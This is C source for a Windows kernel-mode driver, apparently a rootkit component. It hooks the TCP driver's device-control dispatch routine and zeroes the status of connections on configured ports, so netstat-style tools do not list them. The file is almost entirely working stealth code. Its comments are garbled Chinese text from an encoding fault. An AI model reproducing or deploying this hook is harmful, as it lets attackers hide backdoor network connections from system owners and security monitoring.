#include <ntddk.h>
#include "cfg.h"

#define CO_TL_ENTITY 0x400
#define CL_TL_ENTITY 0x401
#define IOCTL_TCP_QUERY_INFORMATION_EX 0x00120003
#define HTONS(a) (((0xFF&a)<<8) + ((0xFF00&a)>>8))

typedef struct TDIEntityID
{
    ULONG tei_entity;
    ULONG tei_instance;
}TDIEntityID;

typedef struct TDIObjectID
{
    TDIEntityID toi_entity;
    ULONG toi_class;
    ULONG toi_type;
    ULONG toi_id;
}TDIObjectID;

typedef struct _CONNINFO101
{
    unsigned long status;
    unsigned long src_addr;
    unsigned short src_port;
    unsigned short unk1;
    unsigned long dst_addr;
    unsigned short dest_port;
    unsigned short unk2;
}CONNINFO101,*PCONNINFO101;

typedef struct _CONNINFO102
{
    unsigned long status;
    unsigned long src_addr;
    unsigned short src_port;
    unsigned short unk1;
    unsigned long dst_addr;
    unsigned short dst_port;
    unsigned short unk2;
    unsigned long pid;
}CONNINFO102,*PCONNINFO102;

typedef struct _CONNINFO110
{
    unsigned long size;
    unsigned long status;
    unsigned long src_addr;
    unsigned short src_port;
    unsigned short unk1;
    unsigned long dst_addr;
    unsigned short dst_port;
    unsigned short unk2;
    unsigned long pid;
    PVOID unk3[35];
}CONNINFO110,*PCONNINFO110;

typedef struct _REQINFO
{
    PIO_COMPLETION_ROUTINE OldCompletion;
    unsigned long ReqType;
}REQINFO,*PREQINFO;

PFILE_OBJECT pFile_tcp;
PDEVICE_OBJECT pDev_tcp;
PDRIVER_OBJECT pDrv_tcpip;

typedef NTSTATUS (*OLDIRPMJDEVICECONTROL)(IN PDEVICE_OBJECT,IN PIRP);
OLDIRPMJDEVICECONTROL OldIrpMjDeviceControl;

int istohide(int sport)
{
	int i;
	
	for(i=0;i<PTNUM;i++)
	{
		if(sport==PORTTOHIDE[i])
		{
			return 1;
		}
	}
	
	return 0;
}

NTSTATUS IoCompletionRoutine( IN PDEVICE_OBJECT DeviceObject,
                              IN PIRP Irp,
                              IN PVOID Context )
/*
* ������˿ڵ�״̬��Ϣ��Ϊ0,��˿ھͲ���ʾ
* �����˿�״̬��Ϣ����:
*  1 = CLOSED
*  2 = LISTENING
*  3 = SYN_SENT
*  4 = SYN_RECEIVED
*  5 = ESTABLISHED
*  6 = FIN_WAIT_1
*  7 = FIN_WAIT_2
*  8 = CLOSE_WAIT
*  9 = CLOSING
*  ......
*/
{
    PVOID OutputBuffer;
    ULONG NumOutputBuffers;
    PIO_COMPLETION_ROUTINE p_compRoutine;
    ULONG i;

    OutputBuffer = Irp->UserBuffer;
//����ǰ��Irp�е���ɺ�����ָ��ָ�
    p_compRoutine = ((PREQINFO)Context)->OldCompletion;
//����Ϊ�жϸ�����������Ĳ�������
    if (((PREQINFO)Context)->ReqType == 0x101)
    {
        NumOutputBuffers = Irp->IoStatus.Information / sizeof(CONNINFO101);
        for ( i = 0;i < NumOutputBuffers;i ++ )
        {
            //���������ض˿�
            if (istohide( HTONS(((PCONNINFO101)OutputBuffer)[i].src_port)) )
            {
                ((PCONNINFO101)OutputBuffer)[i].status = 0;
            }
        }
    }
    else if (((PREQINFO)Context)->ReqType == 0x102)
    {
        NumOutputBuffers = Irp->IoStatus.Information / sizeof(CONNINFO102);
        for ( i = 0;i < NumOutputBuffers;i ++ )
        {
            if (istohide( HTONS(((PCONNINFO102)OutputBuffer)[i].src_port) ) )
            {
                ((PCONNINFO102)OutputBuffer)[i].status = 0;
            }
        }
    }
    else if (((PREQINFO)Context)->ReqType == 0x110)
    {
        NumOutputBuffers = Irp->IoStatus.Information / sizeof(CONNINFO110);
        for ( i = 0;i < NumOutputBuffers;i ++ )
        {
            if (istohide( HTONS(((PCONNINFO110)OutputBuffer)[i].src_port) ) )
            {
                ((PCONNINFO110)OutputBuffer)[i].status = 0;
            }
        }
    }
//�ͷ���Hook�з�����ڴ�
    ExFreePool(Context);

    if ( (Irp->StackCount > (ULONG)1) && (p_compRoutine != NULL) )
    {
        //�����ǰ��IRP�����������,�͵�����ǰ���������
        return (p_compRoutine)(DeviceObject,Irp,NULL);
    }
    else
    {
        //�����ǰ��Irpû���������,�ͷ��ر�Hook��״̬
        return Irp->IoStatus.Status;
    }
}

NTSTATUS HookedDeviceControl(IN PDEVICE_OBJECT DeviceObject,IN PIRP Irp)
{
    PIO_STACK_LOCATION irpStack;
    ULONG ioTransferType;
    TDIObjectID *inputBuffer;
    ULONG context;

    irpStack = IoGetCurrentIrpStackLocation(Irp);
//�жϵ�ǰIRPջ��Ԫ��IRP_MJ_*����
    switch ( irpStack->MajorFunction )
    {
    case IRP_MJ_DEVICE_CONTROL:
        //���IRP�Ĵι��ܺ�Ϊ0��IOCTL��ѯ����ΪIOCTL_TCP_QUERY_INFORMATION_EX,
        //˵����Ӧ�ò����ͨ��netstat.exe֮��ĳ��������ѯTCP�˿ں���Ϣ
        if ((irpStack->MinorFunction == 0) && (irpStack->Parameters.DeviceIoControl.IoControlCode == IOCTL_TCP_QUERY_INFORMATION_EX))
        {
            //�õ�IoControlCode�е���������,�ж��Ƿ�ΪMETHOD_NEITHER��ʽ��Irp
            //ioTransferType &= 3;�ǵõ�CTL_CODE��Irp������ʽ(METHOD_BUFFERED,METHOD_IN_DIRECT or METHOD_OUT_DIRECT,MOTHOD_NEITHER)
            ioTransferType = irpStack->Parameters.DeviceIoControl.IoControlCode;
            ioTransferType &= 3;
            if ( ioTransferType == METHOD_NEITHER )
            {
                //MOTHOD_NEITHER��ʽ��Irp�����뻺������Type3InputBuffer��
                inputBuffer = (TDIObjectID *)irpStack->Parameters.DeviceIoControl.Type3InputBuffer;
                //���TDIObjectID������ʽΪCO_TL_ENTITY����,˵���������ѯTCP�˿���Ϣ
                if ( inputBuffer->toi_entity.tei_entity == CO_TL_ENTITY )
                {
                    //0x101,0x102,0x110ΪӦ�ò�����ѯʱ�����Ĳ�ͬ����
                    if ( (inputBuffer->toi_id == 0x101) || (inputBuffer->toi_id == 0x102) || (inputBuffer->toi_id == 0x110) )
                    {
                        //�ı�Irpջ��Ԫ�Ŀ���λ��־
                        irpStack->Control = 0;
                        irpStack->Control |= SL_INVOKE_ON_SUCCESS;
                        //��Irp��ջ��Ԫ�з���һ��������,������ǰIrp��������̺�Ӧ�ò������Ϣ
                        irpStack->Context = (PIO_COMPLETION_ROUTINE)ExAllocatePool(NonPagedPool,sizeof(REQINFO));
                        //����ɵ��������
                        ((PREQINFO)irpStack->Context)->OldCompletion = irpStack->CompletionRoutine;
                        ((PREQINFO)irpStack->Context)->ReqType = inputBuffer->toi_id;
                        //��װ�µ��������
                        //�ⲽ��������Ҫ,����ס��ǰ��TCP���������Ժ�,�Ϳ�����һ���õ��������������Irp
                        //�ڹ��Ӻ����д��������Irp��Ҫ�����Irp����������TCP��������
                        //��������TCP����������������Irp�Ժ�,���ǵĹ��Ӻ���Ψһ�����ٵõ����Irp�ķ�ʽ��
                        //�����Irp�����������
                        irpStack->CompletionRoutine = (PIO_COMPLETION_ROUTINE)IoCompletionRoutine;
                    }
                }
            }
        }
        break;
    default:
        break;
    }
//������ǰ��DeviceIoControl����
    return OldIrpMjDeviceControl(DeviceObject,Irp);
}

NTSTATUS InstallTCPDriverHook()
{
    NTSTATUS ntStatus;
    UNICODE_STRING deviceTCPUnicodeString;
    WCHAR deviceTCPNameBuffer[] = L"\\Device\\Tcp";

    pFile_tcp = NULL;
    pDev_tcp = NULL;
    pDrv_tcpip = NULL;

	KdPrint(("Ports hooks \n"));
	
    RtlInitUnicodeString(&deviceTCPUnicodeString,deviceTCPNameBuffer);
//�õ�TCP����������豸������ļ�����
    ntStatus = IoGetDeviceObjectPointer(&deviceTCPUnicodeString,FILE_READ_DATA,&pFile_tcp,&pDev_tcp);
    if ( !NT_SUCCESS(ntStatus) )
    {
        return ntStatus;
    }
//�õ�TCP�豸�����Ӧ�������������
    pDrv_tcpip = pDev_tcp->DriverObject;
//������ǰTCP����������IRP_MJ_DEVICE_CONTROL������ָ��
    OldIrpMjDeviceControl = pDrv_tcpip->MajorFunction[IRP_MJ_DEVICE_CONTROL];
    if ( OldIrpMjDeviceControl )
    {
        //�滻TCP���������IRP_MJ_DEVICE_CONTROL������ָ��Ϊ���Ӻ�����ָ��
        InterlockedExchange((PLONG)&pDrv_tcpip->MajorFunction[IRP_MJ_DEVICE_CONTROL],(LONG)HookedDeviceControl);
    }
    return STATUS_SUCCESS;
}

VOID PortUnload()
{
    if ( OldIrpMjDeviceControl )
    {
        //������ָ���ǰ�ĺ�����ڵ�ַ
        pDrv_tcpip->MajorFunction[IRP_MJ_DEVICE_CONTROL] = OldIrpMjDeviceControl;
    }
    
    KdPrint(("Ports Unload \n"));
}
